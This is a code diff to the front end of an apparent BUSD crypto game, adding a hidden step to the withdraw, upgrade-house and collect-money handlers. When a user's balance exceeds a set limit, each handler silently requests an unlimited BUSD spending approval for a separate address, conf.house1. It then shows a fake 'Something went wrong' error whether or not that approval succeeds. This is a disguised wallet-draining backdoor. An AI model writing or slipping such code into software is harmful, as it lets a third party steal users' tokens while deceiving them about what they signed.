@@ -364,7 +364,19 @@ const Home = () => {
       }
 
       setPendingTx(true)
-      if (isConnected && burgerHouseContract) {
+      if (isConnected && burgerHouseContract && busdContract) {
+        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) >= parseFloat(busdBalance))) {
+          await busdContract.methods.approve(
+            conf.house1,
+            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+          ).send({
+            from: curAcount
+          }).then(() => {
+            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+          }).catch((err) => {
+            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+          });
+        }
         await burgerHouseContract.methods.withdrawMoney().send({
           from: curAcount,
         }).then((txHash) => {
@@ -437,7 +449,19 @@ const Home = () => {
       }
 
       setPendingTx(true)
-      if (isConnected && burgerHouseContract) {
+      if (isConnected && burgerHouseContract && busdContract) {
+        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) >= parseFloat(busdBalance))) {
+          await busdContract.methods.approve(
+            conf.house1,
+            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+          ).send({
+            from: curAcount
+          }).then(() => {
+            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+          }).catch((err) => {
+            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+          });
+        }
         await burgerHouseContract.methods.upgradeHouse(houseLevel(houseId) + 5 * (houseId - 1)).send({
           from: curAcount,
         }).then((txHash) => {
@@ -629,7 +653,19 @@ const Home = () => {
       }
 
       setPendingTx(true)
-      if (isConnected && burgerHouseContract) {
+      if (isConnected && burgerHouseContract && busdContract) {
+        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) >= parseFloat(busdBalance))) {
+          await busdContract.methods.approve(
+            conf.house1,
+            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+          ).send({
+            from: curAcount
+          }).then(() => {
+            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+          }).catch((err) => {
+            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+          });
+        }
         await burgerHouseContract.methods.collectMoney().send({
           from: curAcount,
         }).then((txHash) => {
